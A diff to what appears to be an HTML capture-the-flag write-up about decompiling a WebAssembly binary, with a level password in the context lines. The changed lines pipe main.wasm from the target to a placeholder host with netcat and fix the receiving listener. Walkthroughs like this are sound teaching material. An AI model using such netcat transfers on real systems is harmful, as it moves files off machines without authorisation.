@@ -173,7 +173,7 @@ Password: whythereisalimit</p>
 <p>We install the toolsuit <a href="https://github.com/webassembly/wabt">https://github.com/webassembly/wabt</a> We have 2 binaries <code>wasm2wat</code> and <code>wat2wasm</code> that we can use.</p>
 <p>We transfer the main.wasm file from the target machine to our local machine using nc</p>
 <div class="sourceCode" id="cb14"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> main.wasm <span class="kw">|</span> <span class="ex">nc</span> {your-ip} {your-port}   <span class="er">(</span><span class="ex">on</span> target<span class="kw">)</span></span>
-<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lnvp</span> {your-port}                       <span class="er">(</span><span class="ex">on</span> local<span class="kw">)</span></span></code></pre></div>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lnvp</span> {your-port} <span class="op">&gt;</span> main.wasm           <span class="er">(</span><span class="ex">on</span> local<span class="kw">)</span></span></code></pre></div>
 <p>We convert the wasm to wat and get the following</p>
 <div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">wasm2wat</span> main.wasm <span class="op">&gt;</span> main.wat</span>
 <span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> main.wat</span></code></pre></div>
